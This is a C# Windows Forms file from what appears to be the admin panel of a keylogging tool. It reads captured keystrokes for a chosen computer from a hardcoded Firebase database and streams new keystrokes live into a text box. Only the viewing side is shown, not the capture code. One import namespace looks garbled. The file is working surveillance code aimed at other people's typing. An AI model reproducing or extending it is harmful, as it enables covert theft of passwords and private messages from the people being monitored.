using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Firebase.Database;
using Firebase.Kecske;
using Firebase.Database.Query;
using System.Reactive.Linq;
using Firebase.Database.Streaming;

namespace MakeYourDataSafe_Admin
{
    public partial class Keys : Form
    {
        private static string id; //selected computer's ID
        public Keys()
        {
            InitializeComponent();
        }

        public Keys(string xd):this()
        {
            id = xd;
        }

        private void close_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        private const string database = "https://myds-5f6f8.firebaseio.com/";
        private FirebaseClient client = new FirebaseClient(database);
        private async Task Run()
        {
            try
            {
                var child = client.Child("Keystrokes");
                var data = await client.Child("Keystrokes").OnceAsync<GetKeystrokes>();
                foreach (var i in data)
                {
                    if (i.Object.id == id)
                    {
                        this.textBox1.Text += i.Object.key;
                    }
                }
                var observable = child.AsObservable<GetKeystrokes>();
                var subscription = observable.Where(item => !string.IsNullOrEmpty(item.Key)).Where(item => item.Key == id).Subscribe(item => displayKey(item));
            }
            catch (FirebaseException ex)
            {
                MessageBox.Show("Hiba a felhasználók beolvasása során.\r\n" + ex.Message);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Nem várt hiba történt.\r\n" + ex.Message);
            }
        }

        private void displayKey(FirebaseEvent<GetKeystrokes> item)
        {
            textBox1.Text += item.Object.key;
        }

        private void Keys_Load(object sender, EventArgs e)
        {
            Run();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
